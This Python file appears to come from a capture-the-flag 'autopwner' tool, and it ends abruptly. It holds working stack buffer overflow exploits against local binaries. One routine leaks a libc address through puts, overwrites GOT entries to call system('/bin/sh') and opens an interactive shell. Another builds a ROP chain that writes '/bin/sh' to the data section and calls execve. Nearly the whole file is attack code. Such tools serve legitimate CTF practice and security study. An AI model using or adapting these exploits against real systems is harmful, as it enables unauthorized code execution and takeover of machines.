from autopwner_helpers import *

def sledgehammer(challenge_info):
    binary_name = challenge_info["binary_name"]
    elf = challenge_info["elf"]
    offset_to_return_address = challenge_info["offset_to_return_address"]
    pack_int = challenge_info["pack_int"]
    num_junk_inputs = challenge_info["num_junk_inputs_for_smashing"]

    try:
        if elf.bits == 32:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6")
        else:
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

        puts_offset_from_libc_base = libc.symbols['puts']

        p = process(binary_name)
        intro = p.recv()
        print(intro)

        for i in range(num_junk_inputs):
            p.sendline("A")

        payload = b"A"*offset_to_return_address

        if (elf.bits == 32):
            payload += sledgehammer32_payload1_after_offset(challenge_info)
        else:
            payload += sledgehammer64_payload1_after_offset(challenge_info)
            
        p.sendline(payload)
        print(payload)
        leak = p.recv()
        print(leak)

        if elf.bits == 32:
            puts_libc_address = readleak32(leak, puts_offset_from_libc_base)
        else:
            puts_libc_address = readleak64(leak, puts_offset_from_libc_base)

        print(hex(puts_libc_address))
        libc_base_address = puts_libc_address - puts_offset_from_libc_base
        libc.address = libc_base_address


        # try:
        byte_diff = elf.got["gets"] - elf.got["puts"]
        # except:
        #     byte_diff = elf.got["fgets"] - elf.got["puts"]
            
        if (byte_diff > 0):
            num_gets = int(byte_diff/bytes_in_an_address)
        else:
            num_gets = 0

        p.sendline(pack_int(libc.symbols["system"]) + pack_int(libc.symbols['gets'])*num_gets)
        p.sendline(b"/bin/sh\x00")
        p.interactive()
        return True
    except Exception as e:
        print(e)
        return False

def execve_bin_sh_data_section(challenge_info):
    binary_name = challenge_info["binary_name"]
    elf = challenge_info["elf"]
    execve_gadgets = challenge_info["execve_gadgets"]
    offset_to_return_address = challenge_info["offset_to_return_address"]
    pack_int = challenge_info["pack_int"]
    num_junk_inputs = challenge_info["num_junk_inputs_for_smashing"]

    data_section_address = determine_data_section_address(binary_name)
    
    try:
        p = process(binary_name)
        for i in range(num_junk_inputs):
            p.sendline("A")
        payload = b"A" * offset_to_return_address
        payload += pack_int(execve_gadgets["pop_rax_address"]) + pack_int(0x3b)
        payload += pack_int(execve_gadgets["pop_rdx_address"]) + b"/bin/sh\00"
        payload += pack_int(execve_gadgets["pop_rdi_address"]) + pack_int(data_section_address)
        payload += pack_int(execve_gadgets["mov_rdx_into_address_stored_in_rdi"])
        payload += pack_int(execve_gadgets["pop_rsi_address"]) + pack_int(0)
        payload += pack_int(execve_gadgets["pop_rdx_address"]) + pack_int(0)
        payload += pack_int(execve_gadgets["syscall_gadget_address"])

        p.sendline(payload)
        p.interactive()
        return True
    except Exception as e:
        # print(e)
        return False

def shellcode_with_given_leak(challenge_info):
    binary_name = challenge_info["binary_name"]
    p = process(binary_name)
